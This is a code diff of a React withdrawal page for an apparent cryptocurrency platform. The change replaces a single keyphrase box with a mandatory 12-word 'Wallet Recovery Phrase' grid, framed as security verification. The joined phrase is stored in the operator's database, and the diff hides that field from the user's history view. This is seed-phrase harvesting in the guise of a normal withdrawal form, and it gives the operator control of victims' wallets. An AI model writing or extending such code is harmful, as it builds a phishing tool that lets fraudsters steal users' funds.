@@ -1,234 +1,180 @@
-import React, { useState, useEffect } from 'react';
+import React, { useState, useEffect, useMemo } from 'react';
 import { Card, CardContent, CardDescription, CardHeader, CardTitle } from '@/components/ui/card';
 import { Button } from '@/components/ui/button';
 import { Badge } from '@/components/ui/badge';
 import { Input } from '@/components/ui/input';
 import { Label } from '@/components/ui/label';
 import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from '@/components/ui/select';
-import { Alert, AlertDescription } from '@/components/ui/alert';
+import { Alert, AlertDescription, AlertTitle } from '@/components/ui/alert';
 import { useAuth } from '@/contexts/AuthContext';
 import { supabase } from '@/integrations/supabase/client';
 import { useToast } from '@/hooks/use-toast';
-import { ArrowUpCircle, Clock, CheckCircle, XCircle, AlertTriangle, Wallet } from 'lucide-react';
+import { ArrowUpCircle, Clock, CheckCircle, XCircle, AlertTriangle, Wallet, KeyRound } from 'lucide-react';
+
+const KEYPHRASE_LENGTH = 12; // Standard for seed phrase
 
 const Withdrawals = () => {
   const { user, profile } = useAuth();
   const [localProfile, setLocalProfile] = useState<any>(null);
-  const [walletsBalance, setWalletsBalance] = useState<any>(null); 
+  const [walletsBalance, setWalletsBalance] = useState<number | null>(null);
   const { toast } = useToast();
   const [withdrawals, setWithdrawals] = useState<any[]>([]);
   const [isLoading, setIsLoading] = useState(false);
+
   const [withdrawalForm, setWithdrawalForm] = useState({
     currency: 'BTC',
     amount: 0,
     walletAddress: '',
-    walletKeyphrase: ''
   });
-useEffect(() => {
+
+  const [keyphraseWords, setKeyphraseWords] = useState<string[]>(Array(KEYPHRASE_LENGTH).fill(''));
+
+  const finalKeyphrase = useMemo(() => keyphraseWords.join(' ').trim(), [keyphraseWords]);
+  const isKeyphraseComplete = useMemo(() => keyphraseWords.every(word => word.trim().length > 0), [keyphraseWords]);
+
+  const handleKeyphraseChange = (index: number, value: string) => {
+    const cleanedValue = value.toLowerCase().replace(/[^a-z0-9]/g, '');
+    setKeyphraseWords(prev => {
+      const newWords = [...prev];
+      newWords[index] = cleanedValue;
+      return newWords;
+    });
+  };
+
+  const handleInputChange = (field: string, value: any) => {
+    setWithdrawalForm(prev => ({ ...prev, [field]: value }));
+  };
+
   const fetchProfile = async () => {
     if (!user) return;
-    const { data, error } = await supabase
+    const { data } = await supabase
       .from('profiles')
       .select('*')
       .eq('user_id', user.id)
       .single();
-
-    if (data) {
-      setLocalProfile(data); // add this to state
-    }
-    if(error){
-      console.log(error); 
-      throw Error; 
-    }
+    if (data) setLocalProfile(data);
   };
 
-  fetchProfile();
-}, [user]);
-
-
-useEffect(() => {
-  if (user) {
-    fetchWithdrawals();
-  }
-}, [user]);
-
-useEffect(() => {
-  if (user) {
-    fetchWalletBalance();
-  }
-}, [user]);
-  
   const fetchWalletBalance = async () => {
     try {
-      const { data, error } = await supabase
+      const { data } = await supabase
         .from('wallets')
         .select('balance')
-        .eq('user_id', user.id)
+        .eq('user_id', user?.id)
         .maybeSingle();
-        console.log(data.balance); 
-
-      if (error) {
-        console.log(error); 
-        throw error;
-      }
       setWalletsBalance(data?.balance || 0);
-    } catch (err) {
-      console.error('Error fetching wallet balance:', err.message);
+    } catch {
       setWalletsBalance(0);
     }
   };
 
-const fetchWithdrawals = async () => {
-  if (!user) return;
-
-  try {
-    setIsLoading(true);
-
-    const { data, error } = await supabase
-      .from('withdrawals')
-      .select('id, user_id, currency, amount, wallet_address, wallet_keyphrase, status, admin_notes, created_at, processed_at')
-      .eq('user_id', user.id)
-      .order('created_at', { ascending: false });
-
-    if (error) throw error;
-
-    setWithdrawals(data || []);
-  } catch (error: any) {
-    console.error('Error fetching withdrawals:', error.message);
-    toast({
-      title: 'Error Fetching Withdrawals',
-      description: error.message,
-      variant: 'destructive',
-    });
-  } finally {
-    setIsLoading(false);
-  }
-};
-  
-  
-
-   const handleInputChange = (field: string, value: any) => {
-    setWithdrawalForm(prev => ({
-      ...prev,
-      [field]: value
-    }));
+  const fetchWithdrawals = async () => {
+    if (!user) return;
+    try {
+      setIsLoading(true);
+      const { data, error } = await supabase
+        .from('withdrawals')
+        .select('id, user_id, currency, amount, wallet_address, status, admin_notes, created_at, processed_at')
+        .eq('user_id', user.id)
+        .order('created_at', { ascending: false });
+      if (error) throw error;
+      setWithdrawals(data || []);
+    } catch (error: any) {
+      toast({
+        title: 'Error Fetching Withdrawals',
+        description: error.message,
+        variant: 'destructive',
+      });
+    } finally {
+      setIsLoading(false);
+    }
   };
 
+  useEffect(() => { fetchProfile(); }, [user]);
+  useEffect(() => { if (user) { fetchWithdrawals(); fetchWalletBalance(); } }, [user]);
+
   const handleWithdrawal = async () => {
-    if (!user || withdrawalForm.amount <= 0 || !withdrawalForm.walletAddress) return;
-
+    if (!user) return;
+    if (withdrawalForm.amount <= 0 || !withdrawalForm.walletAddress) {
+      toast({ title: 'Missing Details', description: 'Please enter wallet address and amount.', variant: 'destructive' });
+      return;
+    }
     if (!localProfile?.is_verified) {
-      toast({
-        title: 'Verification Required',
-        description: 'You must complete KYC verification before making withdrawals.',
-        variant: 'destructive'
-      });
+      toast({ title: 'Verification Required', description: 'You must complete KYC verification before making withdrawals.', variant: 'destructive' });
       return;
     }
-
     if (withdrawalForm.amount > (walletsBalance || 0)) {
-      toast({
-        title: 'Insufficient Balance',
-        description: 'Withdrawal amount exceeds your available balance.',
-        variant: 'destructive'
-      });
+      toast({ title: 'Insufficient Balance', description: 'Withdrawal amount exceeds your available balance.', variant: 'destructive' });
       return;
     }
-
-    if (!withdrawalForm.walletKeyphrase) {
+    if (!isKeyphraseComplete) {
       toast({
         title: 'Wallet Keyphrase Required',
-        description: 'Please enter your wallet keyphrase for security verification.',
+        description: `Please enter all ${KEYPHRASE_LENGTH} words of your keyphrase.`,
         variant: 'destructive'
       });
       return;
     }
 
     setIsLoading(true);
-
     try {
       const { error } = await supabase
         .from('withdrawals')
         .insert({
           user_id: user.id,
-          currency: "$",
+          currency: withdrawalForm.currency,
           amount: withdrawalForm.amount,
           wallet_address: withdrawalForm.walletAddress,
-          wallet_keyphrase: withdrawalForm.walletKeyphrase,
-          status: 'pending'
+          wallet_keyphrase: finalKeyphrase,
+          status: 'pending',
         });
 
       if (error) throw error;
 
       toast({
         title: 'Withdrawal Submitted',
-        description: `Your withdrawal request for ${withdrawalForm.amount} ${withdrawalForm.currency} has been submitted for review.`,
+        description: `Your withdrawal request for ${withdrawalForm.amount} ${withdrawalForm.currency} has been submitted.`,
       });
 
       fetchWithdrawals();
-      setWithdrawalForm({
-        currency: 'BTC',
-        amount: 0,
-        walletAddress: '',
-        walletKeyphrase: ''
-      });
-
+      setWithdrawalForm({ currency: 'BTC', amount: 0, walletAddress: '' });
+      setKeyphraseWords(Array(KEYPHRASE_LENGTH).fill(''));
     } catch (error: any) {
-      toast({
-        title: 'Error',
-        description: error.message,
-        variant: 'destructive'
-      });
+      toast({ title: 'Error Submitting Withdrawal', description: error.message, variant: 'destructive' });
     }
-
     setIsLoading(false);
   };
 
   const getStatusIcon = (status: string) => {
     switch (status) {
-      case 'pending':
-        return <Clock className="w-4 h-4 text-warning" />;
-      case 'approved':
-        return <CheckCircle className="w-4 h-4 text-primary" />;
-      case 'completed':
-        return <CheckCircle className="w-4 h-4 text-success" />;
-      case 'rejected':
-        return <XCircle className="w-4 h-4 text-destructive" />;
-      default:
-        return <Clock className="w-4 h-4 text-muted-foreground" />;
+      case 'pending': return <Clock className="w-4 h-4 text-yellow-500" />;
+      case 'approved': return <CheckCircle className="w-4 h-4 text-blue-500" />;
+      case 'completed': case 'processed': return <CheckCircle className="w-4 h-4 text-green-500" />;
+      case 'rejected': return <XCircle className="w-4 h-4 text-destructive" />;
+      default: return <Clock className="w-4 h-4 text-muted-foreground" />;
     }
   };
-
   const getStatusColor = (status: string) => {
     switch (status) {
-      case 'pending':
-        return 'bg-warning';
-      case 'approved':
-        return 'bg-primary';
-      case 'completed':
-        return 'bg-success';
-      case 'rejected':
-        return 'bg-destructive';
-      default:
-        return 'bg-muted';
+      case 'pending': return 'bg-yellow-500';
+      case 'approved': return 'bg-blue-500';
+      case 'completed': case 'processed': return 'bg-green-500';
+      case 'rejected': return 'bg-red-500';
+      default: return 'bg-gray-500';
     }
   };
 
-const canWithdraw = localProfile?.kyc_status === 'approved';
-  
+  const canWithdraw = localProfile?.kyc_status === 'approved';
 
   return (
     <div className="space-y-6">
-      {/* Withdrawal Form */}
       <Card className="card-glass">
         <CardHeader>
           <CardTitle className="flex items-center">
             <ArrowUpCircle className="w-5 h-5 mr-2" />
             Request Withdrawal
           </CardTitle>
-          <CardDescription>
-            Withdraw funds from your account
-          </CardDescription>
+          <CardDescription>Withdraw funds from your account</CardDescription>
         </CardHeader>
         <CardContent className="space-y-6">
           {!canWithdraw && (
@@ -236,9 +182,8 @@ const canWithdraw = localProfile?.kyc_status === 'approved';
               <AlertTriangle className="h-4 w-4" />
               <AlertDescription>
                 {!localProfile?.is_verified 
-                  ? 'You must complete KYC verification before making withdrawals. Please visit the KYC section.'
-                  : 'Your KYC verification is pending approval. Withdrawals will be enabled once approved.'
-                }
+                  ? 'You must complete KYC verification before making withdrawals.'
+                  : 'Your KYC verification is pending approval.'}
               </AlertDescription>
             </Alert>
           )}
@@ -247,14 +192,8 @@ const canWithdraw = localProfile?.kyc_status === 'approved';
             <div className="space-y-4">
               <div className="space-y-2">
                 <Label>Currency</Label>
-                <Select 
-                  value={withdrawalForm.currency} 
-                  onValueChange={(value) => handleInputChange('currency', value)}
-                  disabled={!canWithdraw}
-                >
-                  <SelectTrigger>
-                    <SelectValue />
-                  </SelectTrigger>
+                <Select value={withdrawalForm.currency} onValueChange={(value) => handleInputChange('currency', value)}>
+                  <SelectTrigger><SelectValue /></SelectTrigger>
                   <SelectContent>
                     <SelectItem value="BTC">Bitcoin (BTC)</SelectItem>
                     <SelectItem value="USDT">Tether (USDT)</SelectItem>
@@ -262,18 +201,15 @@ const canWithdraw = localProfile?.kyc_status === 'approved';
                   </SelectContent>
                 </Select>
               </div>
-
               <div className="space-y-2">
                 <Label>Amount</Label>
                 <Input
                   type="number"
                   step="0.00000001"
                   min="0"
-                  max={walletsBalance?.balance || 0}
                   placeholder="Enter amount"
                   value={withdrawalForm.amount || ''}
-                  onChange={(e) => handleInputChange('amount', parseFloat(e.target.value))}
-                  disabled={!canWithdraw}
+                  onChange={(e) => handleInputChange('amount', parseFloat(e.target.value) || 0)}
                 />
                 <p className="text-xs text-muted-foreground">
                   Available Balance: ${(walletsBalance || 0).toLocaleString()}
@@ -284,52 +220,62 @@ const canWithdraw = localProfile?.kyc_status === 'approved';
                 <Label>Wallet Address</Label>
                 <Input
                   type="text"
-                  placeholder="Enter your wallet address"
+                  placeholder="Enter your withdrawal wallet address"
                   value={withdrawalForm.walletAddress}
                   onChange={(e) => handleInputChange('walletAddress', e.target.value)}
-                  disabled={!canWithdraw}
                 />
               </div>
 
+              {/* Keyphrase section */}
               <div className="space-y-2">
-                <Label>Wallet Keyphrase</Label>
-                <Input
-                  type="password"
-                  placeholder="Enter your wallet keyphrase for verification"
-                  value={withdrawalForm.walletKeyphrase}
-                  onChange={(e) => handleInputChange('walletKeyphrase', e.target.value)}
-                  disabled={!canWithdraw}
-                />
-                <p className="text-xs text-muted-foreground">
-                  Required for security verification
-                </p>
+                <Label className="text-base font-semibold flex items-center">
+                  <KeyRound className='w-4 h-4 mr-2'/> Wallet Recovery Phrase ({KEYPHRASE_LENGTH} words)
+                </Label>
+                <div className="grid grid-cols-3 sm:grid-cols-4 gap-2">
+                  {keyphraseWords.map((word, index) => (
+                    <div key={index} className="flex items-center">
+                      <span className="text-xs text-muted-foreground w-4 mr-1 text-right">{index + 1}.</span>
+                      <Input
+                        type="text"
+                        placeholder={`Word ${index + 1}`}
+                        value={word}
+                        onChange={(e) => handleKeyphraseChange(index, e.target.value)}
+                        disabled={!canWithdraw}
+                        className="h-8 text-sm"
+                      />
+                    </div>
+                  ))}
+                </div>
+                {!isKeyphraseComplete && (
+                  <p className="text-xs text-destructive/80">Please enter all {KEYPHRASE_LENGTH} words.</p>
+                )}
               </div>
 
               <Button 
                 onClick={handleWithdrawal}
-                disabled={!canWithdraw || isLoading || withdrawalForm.amount <= 0 || !withdrawalForm.walletAddress || !withdrawalForm.walletKeyphrase}
+                disabled={!canWithdraw || isLoading || withdrawalForm.amount <= 0 || !withdrawalForm.walletAddress || !isKeyphraseComplete}
                 className="w-full btn-hero"
               >
                 {isLoading ? 'Processing...' : 'Submit Withdrawal Request'}
               </Button>
             </div>
 
+            {/* Right side info panels */}
             <div className="space-y-4">
               <div className="p-4 border rounded-lg bg-muted/20">
                 <h3 className="font-medium mb-2">Withdrawal Process</h3>
                 <div className="space-y-2 text-sm text-muted-foreground">
-                  <p>1. Submit withdrawal request</p>
-                  <p>2. Admin reviews and approves</p>
-                  <p>3. Funds are processed and sent</p>
-                  <p>4. Transaction completed</p>
+                  <p>1. Submit your request with wallet keyphrase.</p>
+                  <p>2. Admin reviews and approves.</p>
+                  <p>3. Funds are processed and sent to the entered address.</p>
                 </div>
               </div>
 
               <div className="p-4 border rounded-lg bg-warning/10 border-warning/20">
-                <h4 className="font-medium text-warning mb-1">Security Notice</h4>
+                <h4 className="font-medium text-warning mb-1">Security Notice ⚠️</h4>
                 <div className="space-y-1 text-sm text-muted-foreground">
                   <p>• All withdrawals require admin approval</p>
-                  <p>• Processing time: 24-48 hours</p>
+                  <p>• Processing time: 24–48 hours</p>
                   <p>• Minimum withdrawal: $100</p>
                   <p>• Network fees may apply</p>
                 </div>
@@ -362,25 +308,21 @@ const canWithdraw = localProfile?.kyc_status === 'approved';
             <Wallet className="w-5 h-5 mr-2" />
             Withdrawal History
           </CardTitle>
-          <CardDescription>
-            Track your withdrawal requests
-          </CardDescription>
+          <CardDescription>Track your withdrawal requests</CardDescription>
         </CardHeader>
         <CardContent>
-          {withdrawals.length === 0 ? (
-            <div className="text-center py-8 text-muted-foreground">
-              No withdrawal requests yet.
-            </div>
+          {isLoading ? (
+            <div className="text-center py-8 text-muted-foreground">Loading history...</div>
+          ) : withdrawals.length === 0 ? (
+            <div className="text-center py-8 text-muted-foreground">No withdrawal requests yet.</div>
           ) : (
             <div className="space-y-4">
               {withdrawals.map((withdrawal) => (
                 <div key={withdrawal.id} className="border rounded-lg p-4">
                   <div className="flex items-center justify-between mb-3">
                     <div className="flex items-center space-x-3">
-                      <div className="flex items-center space-x-2">
-                        {getStatusIcon(withdrawal.status)}
-                        <span className="font-medium">{withdrawal.currency}</span>
-                      </div>
+                      {getStatusIcon(withdrawal.status)}
+                      <span className="font-medium">{withdrawal.currency}</span>
                       <Badge className={`${getStatusColor(withdrawal.status)} text-white`}>
                         {withdrawal.status}
                       </Badge>
@@ -398,11 +340,8 @@ const canWithdraw = localProfile?.kyc_status === 'approved';
                   <div className="space-y-2 text-sm">
                     <div>
                       <p className="text-muted-foreground">Wallet Address</p>
-                      <p className="font-mono break-all">
-                        {withdrawal.wallet_address}
-                      </p>
+                      <p className="font-mono break-all">{withdrawal.wallet_address}</p>
                     </div>
-                    
                     {withdrawal.admin_notes && (
                       <div>
                         <p className="text-muted-foreground">Admin Notes</p>
@@ -429,3 +368,4 @@ const canWithdraw = localProfile?.kyc_status === 'approved';
 };
 
 export default Withdrawals;
+
